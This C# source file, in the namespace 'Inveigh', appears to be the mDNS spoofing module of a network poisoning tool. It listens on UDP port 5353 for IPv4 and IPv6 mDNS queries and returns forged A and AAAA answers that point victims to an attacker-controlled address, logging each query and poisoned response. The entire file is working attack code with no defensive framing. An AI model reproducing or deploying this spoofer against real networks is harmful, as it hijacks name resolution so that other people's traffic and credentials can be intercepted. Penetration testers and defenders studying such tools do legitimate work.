using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class MDNS
    {

        public static void MDNSListener(string ipVersion, string IP)
        {
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, 5353);
            UdpClient udpClient;

            if (String.Equals(ipVersion, "IPv6"))
            {
                ipEndPoint = new IPEndPoint(IPAddress.IPv6Any, 5353);
                udpClient = UDP.UDPListener("MDNSv6", ipVersion, IP, 5353);
            }
            else
            {
                udpClient = UDP.UDPListener("MDNS", ipVersion, IP, 5353);
            }

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    MDNSReply("listener", ipVersion, null, udpPayload, null, destinationIPAddress, ipEndPoint, udpClient);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] mDNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void MDNSReply(string method, string ipVersion, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            string mdnsResponseMessage = "";
            byte[] mdnsType = new byte[2];
            int sourcePortNumber = 0;
            string responseStatus = "-";
            bool enabled = Program.enabledMDNS;
            string question = "QM";

            if (String.Equals(method, "listener"))
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;
            }

            string sourceIP = sourceIPAddress.ToString();
            string IP = Program.argIP;

            if (String.Equals(ipVersion, "IPv6"))
            {
                IP = Program.argIPv6;
                enabled = Program.enabledMDNSv6;
            }

            if (BitConverter.ToString(payload).EndsWith("-00-01-80-01"))
            {
                question = "QU";
            }

            byte[] transactionID = new byte[2];
            Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
            byte[] questions = new byte[2];
            Buffer.BlockCopy(payload, 4, questions, 0, 2);
            string requestHostFull = Util.ParseNameQuery(12, payload);
            byte[] request = new byte[requestHostFull.Length + 2];
            Buffer.BlockCopy(payload, 12, request, 0, request.Length);
            byte[] type = new byte[2];
            Buffer.BlockCopy(payload, (request.Length + 12), type, 0, 2);
            string typeName = Util.GetRecordType(type);
            string[] requestSplit = requestHostFull.Split('.');

            if (!String.Equals(BitConverter.ToString(questions), "00-00"))
            {

                if (requestSplit != null && requestSplit.Length > 0)
                {
                    mdnsResponseMessage = Util.CheckRequest("MDNS", requestSplit[0], sourceIP, IP, typeName, Program.argMDNSTypes, enabled);
                }

                if (enabled && String.Equals(mdnsResponseMessage, "response sent"))
                {

                    if (Array.Exists(Program.argMDNSQuestions, element => element == question))
                    {
                        responseStatus = "+";

                        if (String.Equals(question, "QM") && String.Equals(Program.argMDNSUnicast, "N") && String.Equals(ipVersion, "IPv4"))
                        {
                            sourceIPAddress = IPAddress.Parse("224.0.0.251");
                        }
                        else if (String.Equals(question, "QM") && String.Equals(Program.argMDNSUnicast, "N") && String.Equals(ipVersion, "IPv6"))
                        {
                            sourceIPAddress = IPAddress.Parse("ff02::fb");
                        }

                        byte[] response = MDNS.GetMDNSResponse(method, ipVersion, typeName, sourceIPAddress, destinationIPAddress, sourcePortData, payload);

                        if (String.Equals(method, "sniffer"))
                        {
                            UDP.UDPSnifferClient(ipVersion, 5353, sourceIPAddress, 5353, response);
                        }
                        else
                        {
                            UDP.UDPListenerClient(sourceIPAddress, 5353, udpClient, response);
                        }

                    }
                    else
                    {
                        mdnsResponseMessage = question + " disabled";
                    }

                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] mDNS({2})({3}) request for {4} from {5} [{6}]", responseStatus, DateTime.Now.ToString("s"), question, typeName, requestHostFull, sourceIPAddress, mdnsResponseMessage));
                }

            }

        }

        public static byte[] GetMDNSResponse(string method, string ipVersion, string type, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] sourcePortData, byte[] payload)
        {
            byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argMDNSTTL));
            Array.Reverse(TTL);
            Array.Reverse(sourcePortData);
            byte[] transactionID = new byte[2];
            Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
            string requestHostFull = Util.ParseNameQuery(12, payload);
            byte[] request = new byte[requestHostFull.Length + 2];
            Buffer.BlockCopy(payload, 12, request, 0, request.Length);
            string IP = Program.argIP;

            if (String.Equals(ipVersion, "IPv6"))
            {
                IP = Program.argIPv6;
            }

            byte[] spooferIPData = Program.spooferIPData; // todo add aaaa
            MemoryStream memoryStream = new MemoryStream();

            if(String.Equals(method, "sniffer"))
            {
                memoryStream.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                memoryStream.Write(sourcePortData, 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            switch (type)
            {

                case "A":
                    memoryStream.Write(transactionID, 0, transactionID.Length);
                    memoryStream.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                    memoryStream.Write(request, 0, request.Length);
                    memoryStream.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                    memoryStream.Write(TTL, 0, 4);
                    memoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                    memoryStream.Write(spooferIPData, 0, spooferIPData.Length);
                    break;

                case "AAAA":
                    memoryStream.Write(transactionID, 0, transactionID.Length);
                    memoryStream.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                    memoryStream.Write(request, 0, request.Length);
                    memoryStream.Write((new byte[4] { 0x00, 0x1c, 0x80, 0x01 }), 0, 4);
                    memoryStream.Write(TTL, 0, 4);
                    memoryStream.Write((new byte[2] { 0x00, 0x10 }), 0, 2);
                    memoryStream.Write(Program.spooferIPv6Data, 0, Program.spooferIPv6Data.Length);
                    break;

            }       

            if (String.Equals(method, "sniffer"))
            {
                memoryStream.Position = 4;
                memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
            }

            return memoryStream.ToArray();
        }

    }

}
